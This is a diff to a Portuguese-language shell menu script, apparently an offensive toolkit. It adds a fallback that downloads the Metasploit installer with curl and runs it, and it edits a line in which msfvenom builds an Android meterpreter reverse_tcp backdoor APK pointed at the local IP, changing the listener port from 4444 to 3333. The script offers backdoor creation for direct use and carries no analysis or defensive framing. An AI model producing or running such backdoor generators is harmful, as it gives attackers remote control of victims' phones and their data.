@@ -85,8 +85,15 @@ fi
 elif [ $op -eq 2 ];then
 
 echo " ..................... INSTALANDO ................>>  waiting.."
-sudo apt-cache search  metasploit-framework
 sudo apt-get install metasploit-framework
+if [  $? -eq 0 ];then
+	echo ".......>>>"
+else
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+rm -rf msfinstall
+fi
 clear
 echo " ..................... INSTALAdO! ................>>  OK"
 sleep 3;
@@ -104,7 +111,7 @@ sudo msfconsole
 elif [ $msf -eq 2 ];then
 echo "GERANDO BACKDOR PARA REDE INTERNA......"
 ip=`ifconfig | grep broadcast |  cut -c14-26`
-sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT=4444 > $PWD/backdoor.apk
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT=3333 > $PWD/backdoor.apk
 
 fi
 elif [ $op -eq 3 ];then
